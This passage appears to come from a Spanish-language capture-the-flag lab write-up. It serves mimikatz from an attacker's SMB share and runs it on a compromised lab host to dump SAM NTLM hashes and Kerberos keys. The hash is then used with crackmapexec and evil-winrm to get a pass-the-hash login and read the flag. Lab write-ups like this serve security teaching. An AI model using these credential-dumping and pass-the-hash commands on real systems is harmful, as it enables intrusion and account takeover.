Desde nuestro sistema Linux, crearemos un servicio SMB utilizando smbserver de Impacket, donde compartiremos el archivo compilado de mimikatz.exe, con soporte para SMBv2.

```powershell
PS C:\Users\pc1\Desktop> Enter-PSSession -ComputerName dev.htb.local  
[dev.htb.local]: PS C:\Users\Administrator\Documents> whoami
htb\administrator
[dev.htb.local]: PS C:\Users\Administrator\Documents>
```

```bash
❯ impacket-smbserver kali . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

En la sesión de Administrator en dev.htb.local, procedemos a copiar el archivo mimikatz.exe y lo utilizamos para realizar el volcado de la SAM del equipo, con el fin de visualizar los hashes NTLM.

```powershell
[dev.htb.local]: PS C:\Users\Administrator\Documents> cp \\10.10.14.10\kali\mimikatz.exe .
[dev.htb.local]: PS C:\Users\Administrator\Documents> .\mimikatz.exe 'token::elevate' 'lsadump::sam' exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

544     {0;000003e7} 1 D 35298          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;001327d5} 0 D 1314717     HTB\Administrator       S-1-5-21-4266912945-3985045794-2943778634-500  (14g,24p)        Primary  
 * Thread Token  : {0;000003e7} 1 D 1329433     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : DEV
SysKey : e4b2298c95677ce18cd2198b9a36c7df
Local SID : S-1-5-21-4124311166-4116374192-336467615

SAMKey : bb3dbea7ca8bea043c6523bf5d915ae9

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 67bb396c79f56301b7dc5d219cc85d86

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03fc719a49e2ead4264a2690b650d7f0

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.HTB.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a0e06c2d823c4ffc2249abfd6af36dc90733a7c395ee81094261caf3d6c2dbd1
      aes128_hmac       (4096) : 6cf34b183d3555966797dcd55e6128ba
      des_cbc_md5       (4096) : 202667ab89080ebf
    OldCredentials
      aes256_hmac       (4096) : 977755e7a9132c495b90fe59cf5471cd1187b9dab491dac0cb6d02bcc5e30740
      aes128_hmac       (4096) : e56a6fc47b432e347ad3d918056626fd
      des_cbc_md5       (4096) : 074aae9e5df751f1
    OlderCredentials
      aes256_hmac       (4096) : 9d211ec8e9afdb2bd168120abc6a97375b3aa14826b6b512236c16cc361cd290
      aes128_hmac       (4096) : 99caad607311ade6c51edf9bf0afdd08
      des_cbc_md5       (4096) : 547afdf27c165e3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DEV.HTB.LOCALAdministrator
    Credentials
      des_cbc_md5       : 202667ab89080ebf
    OldCredentials
      des_cbc_md5       : 074aae9e5df751f1


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

mimikatz(commandline) # exit
Bye!
[dev.htb.local]: PS C:\Users\Administrator\Documents>
```

Con el hash NT de Administrator, podemos verificar su validez utilizando crackmapexec para una autenticación a nivel local. Este hash es válido tanto para SMB como para WinRM.

```bash
❯ crackmapexec smb dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86 --local-auth
SMB         dev.htb.local   445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:DEV) (signing:False) (SMBv1:True)  
SMB         dev.htb.local   445    DEV              [+] DEV\Administrator:67bb396c79f56301b7dc5d219cc85d86 (Pwn3d!)

❯ crackmapexec winrm dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86 --local-auth
SMB         dev.htb.local   5985   DEV              [*] Windows 10.0 Build 17763 (name:DEV) (domain:DEV)
HTTP        dev.htb.local   5985   DEV              [*] http://dev.htb.local:5985/wsman
WINRM       dev.htb.local   5985   DEV              [+] DEV\Administrator:67bb396c79f56301b7dc5d219cc85d86 (Pwn3d!)
```

Podemos simplemente conectarnos con `evil-winrm` usando el hash y leer la `flag`

```powershell
❯ evil-winrm -i dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86  
PS C:\Users\Administrator\Documents> whoami
dev\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
HADES{Sp0ol******sO_Brok3n}
```
